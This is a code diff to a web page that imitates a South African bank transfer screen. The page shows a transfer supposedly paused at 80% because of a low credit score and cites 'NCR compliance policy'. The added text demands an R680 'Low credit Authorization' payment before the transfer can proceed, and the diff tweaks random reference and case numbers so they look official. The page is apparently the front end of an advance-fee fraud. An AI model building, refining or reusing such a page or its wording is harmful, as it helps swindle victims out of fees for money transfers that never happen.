@@ -610,7 +610,7 @@ tbody td{padding:9px 10px;color:var(--text);vertical-align:middle;}
         <div class="risk-gauge"><span class="risk-num">28%</span></div>
         <div class="risk-info">
           <div class="risk-label"><i class="fas fa-exclamation-circle" style="margin-right:4px;"></i>Low Credit Score Detected</div>
-          <p>This recipient's credit profile scores below the minimum threshold (580). The transfer has been paused at 80% pending risk authorisation as required by NCR compliance policy.</p>
+          <p>This recipient's credit profile scores below the minimum threshold (580). The transfer has been paused at 80% pending risk authorisation as required by NCR compliance policy. you ust complete your R680 Payment for your Low credit Authorization to allow it permit your Transfer</p>
         </div>
       </div>
 
@@ -620,7 +620,7 @@ tbody td{padding:9px 10px;color:var(--text);vertical-align:middle;}
         <div class="auth-detail-row"><span class="k">Bank</span><span class="v" id="authBank">—</span></div>
         <div class="auth-detail-row"><span class="k">Account</span><span class="v masked">••••••<span id="authAcc">0000</span></span></div>
         <div class="auth-detail-row"><span class="k">Transfer Amount</span><span class="v" id="authAmount" style="color:#dc2626;">—</span></div>
-        <div class="auth-detail-row"><span class="k">Credit Score</span><span class="v" style="color:#dc2626;">282 / 1000 (Very Low)</span></div>
+        <div class="auth-detail-row"><span class="k">Credit Score</span><span class="v" style="color:#dc2626;"> (Very Low |Less than 640)</span></div>
         <div class="auth-detail-row"><span class="k">Risk Rating</span><span class="v" style="color:#dc2626;">HIGH RISK — Category 4</span></div>
         <div class="auth-detail-row"><span class="k">Transfer Progress</span><span class="v" style="color:#f59e0b;">80% — SUSPENDED</span></div>
         <div class="auth-detail-row"><span class="k">Auth Reference</span><span class="v" id="authRef">—</span></div>
@@ -800,8 +800,8 @@ function startTransfer(e){
   const acc4 = accNum.slice(-4);
   const id4  = idNum.slice(-4);
   const amtFmt = 'R '+amount.toLocaleString('en-ZA',{minimumFractionDigits:2});
-  const refCode = 'TF-'+Math.floor(Math.random()*900000+100000);
-  const caseRef = 'CRD-AUTH-'+Math.floor(Math.random()*9000000+1000000);
+  const refCode = 'TF-'+Math.floor(Math.random()*+100000);
+  const caseRef = 'CRD-AUTH-'+Math.floor(Math.random()*+1000000);
 
   // Update current TX preview
   document.getElementById('ctx-amt').textContent = amtFmt;
